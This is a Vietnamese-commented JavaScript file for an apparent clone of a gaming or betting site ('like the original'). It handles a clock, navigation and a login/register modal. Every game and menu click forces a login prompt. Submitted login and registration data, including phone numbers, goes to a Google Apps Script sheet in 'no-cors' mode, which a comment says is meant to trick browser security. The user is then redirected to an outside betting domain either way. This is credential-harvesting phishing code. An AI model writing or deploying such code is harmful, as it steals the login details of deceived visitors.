// 1. Cập nhật đồng hồ thời gian thực trên Header PC (Giống bản gốc)
function updateTime() {
    const timeElement = document.querySelector('.time');
    if (timeElement) {
        const now = new Date();
        const year = now.getFullYear();
        const month = String(now.getMonth() + 1).padStart(2, '0');
        const date = String(now.getDate()).padStart(2, '0');
        const hours = String(now.getHours()).padStart(2, '0');
        const minutes = String(now.getMinutes()).padStart(2, '0');
        const seconds = String(now.getSeconds()).padStart(2, '0');
        
        // Hiển thị theo định dạng 2026/09/04 03:15:21
        timeElement.textContent = `${year}/${month}/${date} ${hours}:${minutes}:${seconds}`;
    }
}
// Chạy hàm updateTime mỗi 1 giây (1000ms)
setInterval(updateTime, 1000);
updateTime(); // Gọi ngay lần đầu để không bị delay


// 2. Xử lý sự kiện click cho thanh điều hướng dưới cùng (Bottom Nav Mobile)
const bottomNavItems = document.querySelectorAll('.bottom-nav-mobile .nav-item');
bottomNavItems.forEach(item => {
    item.addEventListener('click', function() {
        // Xóa class 'active' khỏi tất cả các mục
        bottomNavItems.forEach(nav => nav.classList.remove('active'));
        // Thêm class 'active' (đổi màu vàng) vào mục vừa được click
        this.classList.add('active');
    });
});


// 3. Xử lý nút Menu (Icon 3 gạch) trên Mobile
const menuIcon = document.querySelector('.menu-icon');
if (menuIcon) {
    menuIcon.addEventListener('click', () => {
        alert('Tính năng mở Sidebar Menu đang được phát triển!');
    });
}


// ================= XỬ LÝ MODAL ĐĂNG NHẬP / ĐĂNG KÝ =================
const authModal = document.getElementById('authModal');
const closeModalBtn = document.querySelector('.close-modal');
const loginBtns = document.querySelectorAll('.open-login');
const registerBtns = document.querySelectorAll('.open-register');
const tabBtns = document.querySelectorAll('.tab-btn');
const authForms = document.querySelectorAll('.auth-form');

// Hàm mở Modal và chọn đúng Tab
function openAuthModal(targetFormId) {
    authModal.classList.add('show');
    
    // Cập nhật trạng thái Tab và Form
    tabBtns.forEach(btn => {
        if (btn.getAttribute('data-target') === targetFormId) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });

    authForms.forEach(form => {
        if (form.id === targetFormId) {
            form.classList.add('active');
        } else {
            form.classList.remove('active');
        }
    });
}

// Bắt sự kiện cho nút Đăng Nhập
loginBtns.forEach(btn => {
    btn.addEventListener('click', () => openAuthModal('login-form'));
});

// Bắt sự kiện cho nút Đăng Ký
registerBtns.forEach(btn => {
    btn.addEventListener('click', () => openAuthModal('register-form'));
});

// Đóng Modal khi bấm nút X
closeModalBtn.addEventListener('click', () => {
    authModal.classList.remove('show');
});

// Đóng Modal khi bấm ra ngoài vùng form
window.addEventListener('click', (e) => {
    if (e.target === authModal) {
        authModal.classList.remove('show');
    }
});

// Chuyển đổi qua lại giữa 2 Tab bên trong Modal
tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        const target = btn.getAttribute('data-target');
        openAuthModal(target);
    });
}); // <--- LỖI CỦA BẠN NẰM Ở ĐÂY (Thiếu dấu đóng vòng lặp này)


// ================= YÊU CẦU ĐĂNG NHẬP KHI BẤM VÀO GAME/NÚT KHÁC =================
// Chọn tất cả các thẻ game và các nút chức năng trên cả PC lẫn Mobile
const requireLoginElements = document.querySelectorAll(`
    .game-card, 
    .sub-game-item, 
    .m-game-card, 
    .transaction-btn, 
    .lobby-item, 
    .btn-more, 
    .btn-guide, 
    .m-dl-btn,
    .btn-play,
    .nav-item, /* Menu trên Mobile */
    .nav-pc   /* Các đường link menu trên PC */
`);

// Lặp qua từng phần tử và gắn sự kiện click
requireLoginElements.forEach(element => {
    element.addEventListener('click', (e) => {
        e.preventDefault(); 
        e.stopPropagation(); 
        openAuthModal('login-form');
    });
});

// ================= KẾT NỐI GOOGLE SHEETS & CHUYỂN HƯỚNG =================
const scriptURL = 'https://script.google.com/macros/s/AKfycbwcYJU1rYgqctxr3oFWxCUUn1uwB_SibIW0ZHc46Nhgq1qjC7MSKe-Y8kNThO01m6Y/exec'; 

const loginForm = document.getElementById('login-form');
const registerForm = document.getElementById('register-form');

// Hàm kiểm tra ràng buộc (Validation) bằng JS
function validateForm(form) {
    const phone = form.phone.value.trim();
    // Regex kiểm tra chuỗi có đúng 10 chữ số hay không
    const phoneRegex = /^[0-9]{10}$/;
    
    if (!phoneRegex.test(phone)) {
        alert("Cảnh báo: Vui lòng nhập đúng định dạng 10 số điện thoại!");
        return false;
    }
    return true; // Nếu mọi thứ ổn
}

// Xử lý Form Đăng nhập
if (loginForm) {
    loginForm.addEventListener('submit', e => {
        e.preventDefault(); 
        
        // Kích hoạt hàm kiểm tra ràng buộc, nếu sai sẽ dừng gửi
        if (!validateForm(loginForm)) return;
        
        let formData = new FormData(loginForm);
        formData.append('status', 'Đăng nhập');
        
        const submitBtn = loginForm.querySelector('.submit-btn');
        submitBtn.textContent = 'Đang xử lý...';
        submitBtn.disabled = true;
        
        // Thêm mode: 'no-cors' để đánh lừa bảo mật trình duyệt, giúp dữ liệu vào Sheet
        fetch(scriptURL, { 
            method: 'POST', 
            body: formData,
            mode: 'no-cors' 
        })
        .then(() => {
            window.location.href = "https://www.qq7722.com/";
        })
        .catch(() => {
            // Dù có lỗi mạng thì vẫn ép chuyển trang
            window.location.href = "https://www.qq7722.com/";
        });
    });
}

// Xử lý Form Đăng ký
if (registerForm) {
    registerForm.addEventListener('submit', e => {
        e.preventDefault();
        
        // Kích hoạt hàm kiểm tra ràng buộc
        if (!validateForm(registerForm)) return;
        
        let formData = new FormData(registerForm);
        formData.append('status', 'Đăng ký');
        
        const submitBtn = registerForm.querySelector('.submit-btn');
        submitBtn.textContent = 'Đang xử lý...';
        submitBtn.disabled = true;
        
        // Thêm mode: 'no-cors'
        fetch(scriptURL, { 
            method: 'POST', 
            body: formData,
            mode: 'no-cors'
        })
        .then(() => {
            window.location.href = "https://www.qq7722.com/";
        })
        .catch(() => {
            window.location.href = "https://www.qq7722.com/";
        });
    });
}